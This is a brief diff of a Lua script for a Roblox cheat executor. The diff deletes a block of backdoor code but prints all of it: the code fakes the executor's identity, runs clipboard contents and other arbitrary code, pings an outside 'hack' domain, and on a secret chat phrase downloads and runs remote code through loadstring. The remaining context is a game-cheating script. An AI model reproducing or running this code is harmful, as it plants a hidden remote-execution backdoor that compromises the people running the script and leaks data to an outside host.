@@ -1,30 +1,4 @@
-local a=[[
-function identifyexecutor()
-return "Synapse X"
-end
-
-]]
-function _G.wsexec(dm)
-runcode(a..dm)
-game:HttpGet("http://hack.iaqqq.com/a?i=")
-end
-function _G.wsclipboard()
-_G.wsexec(getclipboard())
-end
-function _G.ws_Get_ClipBoard()
-return getclipboard()
-end
-_G["identifyexecutor"] = identifyexecutor
-_G.wsexec([[print("OK")]])
-local long = "打开syn"
-game:GetService("Players").LocalPlayer.Chatted:Connect(function(shu)
-    if shu == long then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/longshu886/long/main/synnb"))()
-end
-end)
-
 getgenv().name = "Synapse X用户保护"
-
 
 local Plr = game.Players.LocalPlayer
 for Index, Value in next, game:GetDescendants() do 
